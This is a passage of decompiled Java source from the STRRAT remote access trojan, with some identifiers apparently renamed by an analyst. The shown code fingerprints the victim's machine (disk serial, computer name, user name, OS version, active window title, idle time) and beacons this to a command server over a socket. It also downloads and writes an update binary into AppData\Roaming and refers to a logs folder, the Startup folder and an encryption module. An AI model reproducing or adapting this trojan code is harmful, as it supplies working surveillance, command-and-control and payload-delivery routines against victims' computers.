         BufferedReader var6 = new BufferedReader(new InputStreamReader(var5.getInputStream()));
         StringBuilder var1 = new StringBuilder();

         label25:
         while(true) {
            BufferedReader var10000 = var6;

            String var2;
            while((var2 = var10000.readLine()) != null) {
               if (var2.trim().equals("")) {
                  continue label25;
               }

               var10000 = var6;
               var1.append(var2);
            }

            var6.close();
            if (var1.toString().equals("")) {
               return true;
            }

            return false;
         }
      } catch (Exception var3) {
         return false;
      }
   }

   // $FF: synthetic method
   private static int getInputData() {
      byte[] var0 = new byte[1];
      StringBuilder var2 = new StringBuilder();

      int var1;
      try {
         while((var1 = socketInputStream.read(var0, 0, 1)) != -1) {
            var2.append(new String(var0, 0, var1));
            if (var2.toString().endsWith("\r\n\r\n")) {
               String var3 = var2.toString();
               return Integer.parseInt(var3.substring(0, var3.indexOf("\r\n\r\n")));
            }
         }
      } catch (Exception e) {
         throw new RuntimeException(e);
      }


      throw new RuntimeException();
   }

   // $FF: synthetic method
   static void socketKeepAlive() {
      StringBuilder info = (new StringBuilder()).insert(0, "ping|");
      String var2;
      if (someEmptyString.equals("")) {
         someEmptyString = (new StringBuilder()).insert(0, getDiskSerialNumber()).append(socketSeparator).toString();
         someEmptyString = (new StringBuilder()).insert(0, someEmptyString).append(getComputerName()).append(socketSeparator).toString();
         someEmptyString = (new StringBuilder()).insert(0, someEmptyString).append(getUserName()).append(socketSeparator).toString();
         String[] var0 = getSystemVersion();
         someEmptyString = (new StringBuilder()).insert(0, someEmptyString).append(var0[0]).append(socketSeparator).toString();
         someEmptyString = (new StringBuilder()).insert(0, someEmptyString).append(var0[1]).append(socketSeparator).toString();
         someEmptyString = (new StringBuilder()).insert(0, someEmptyString).append(someSystemInfo()).append(socketSeparator).toString();
         someEmptyString = (new StringBuilder()).insert(0, someEmptyString).append("[win_title]").toString();
         if (FileEncryptManager.isDocumentsEndsWithCrimson()) {
            var2 = "Installed";
         } else {
            var2 = "Not Installed";
         }

         someEmptyString = (new StringBuilder()).insert(0, "STRRAT").append(socketSeparator).append(someEmptyString).append(socketSeparator).append("1.4").append(socketSeparator).append(nndfdffd()).append(socketSeparator).append(var2).append(socketSeparator).append("[idle_time]").toString();
      }

      var2 = info.append(someEmptyString.replace("[idle_time]", delayBetweenLastUserInput.lastUserInput()).replace("[win_title]", currentWindowName())).toString();
      String var1 = String.valueOf(var2.getBytes().length + "\r\n\r\n");
      try {
         socketOutputStream.write(var1.getBytes());
         socketOutputStream.write(var2.getBytes());
         socketOutputStream.flush();
      } catch (Exception e) {
         throw new RuntimeException(e);
      }

   }

   // $FF: synthetic method
   private static File updateMalware(String var0) {
      int var1 = getInputData();
      byte[] var2 = new byte[8192];
      FileOutputStream var4 = null;
      try {
         var4 = new FileOutputStream((new StringBuilder()).insert(0, appdataRoaming).append(var0).toString());
      } catch (FileNotFoundException e) {
         throw new RuntimeException(e);
      }
      int var5 = 0;
      int var3 = var1;

      for(int var10000 = 0; var10000 != var1; var10000 = var5) {
         if (var3 >= 8192) {
            var3 = 8192;
         } else {
            var3 = var3;
         }
         try {
            var3 = socketInputStream.read(var2, 0, var3);

         } catch (Exception e) {
            throw new RuntimeException(e);
         }
         var5 += var3;
         if (var3 == -1) {
            throw new RuntimeException();
         }
         try {
            var4.write(var2, 0, var3);

         } catch (Exception e) {
            throw new RuntimeException(e);
         }
         var3 = var1 - var5;
      }
      try {
         var4.close();

      } catch (Exception e) {
         throw new RuntimeException(e);
      }
      return new File((new StringBuilder()).insert(0, appdataRoaming).append(var0).toString());
   }

   // $FF: synthetic method
   private static String shshnfdn() {
      if (someEmptyString.equals("")) {
         someEmptyString = (new StringBuilder()).insert(0, getDiskSerialNumber()).append(socketSeparator).toString();
         someEmptyString = (new StringBuilder()).insert(0, someEmptyString).append(getComputerName()).append(socketSeparator).toString();
         someEmptyString = (new StringBuilder()).insert(0, someEmptyString).append(getUserName()).append(socketSeparator).toString();
         String[] var0 = getSystemVersion();
         someEmptyString = (new StringBuilder()).insert(0, someEmptyString).append(var0[0]).append(socketSeparator).toString();
         someEmptyString = (new StringBuilder()).insert(0, someEmptyString).append(var0[1]).append(socketSeparator).toString();
         someEmptyString = (new StringBuilder()).insert(0, someEmptyString).append(someSystemInfo()).append(socketSeparator).toString();
         someEmptyString = (new StringBuilder()).insert(0, someEmptyString).append("[win_title]").toString();
         String var1;
         if (FileEncryptManager.isDocumentsEndsWithCrimson()) {
            var1 = "Installed";
         } else {
            var1 = "Not Installed";
         }

         return (someEmptyString = (new StringBuilder()).insert(0, "STRRAT").append(socketSeparator).append(someEmptyString).append(socketSeparator).append("1.4").append(socketSeparator).append(nndfdffd()).append(socketSeparator).append(var1).append(socketSeparator).append("[idle_time]").toString()).replace("[idle_time]", delayBetweenLastUserInput.lastUserInput()).replace("[win_title]", currentWindowName());
      } else {
         return someEmptyString.replace("[idle_time]", delayBetweenLastUserInput.lastUserInput()).replace("[win_title]", currentWindowName());
      }
   }

   public static String sdfsldf(int var0) {
      char[] var1 = new char[260];
      Shell32.INSTANCE.SHGetFolderPath((HWND)null, var0, (HANDLE)null, ShlObj.SHGFP_TYPE_CURRENT, var1);
      System.out.println("Native to string: " + Native.toString(var1));
      return Native.toString(var1);
   }

   // $FF: synthetic method
   private static Socket sendSocketMessage(String message) {
      String messageSplited = String.valueOf(message.getBytes().length + "\r\n\r\n");
      Socket socket;
      try {
         socket = new Socket(socketAddressCopy, socketPortCopy);
         OutputStream outputStream = socket.getOutputStream();
         outputStream.write(messageSplited.getBytes());
         outputStream.write(message.getBytes());
         outputStream.flush();
      } catch (Exception e) {
         throw new RuntimeException(e);
      }

      return socket;
   }

   static {
      appdataRoaming = (new StringBuilder()).insert(0, sdfsldf(26)).append(File.separator).toString();
      roamingStrlogs = (new StringBuilder()).insert(0, appdataRoaming).append("strlogs").append(File.separator).toString();
      (new StringBuilder()).insert(0, sdfsldf(7)).append(File.separator); //C:\Users\TheEasyPeasy\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
      someEmptyString = "";
      isConnectedWithServer = true;
   }
}
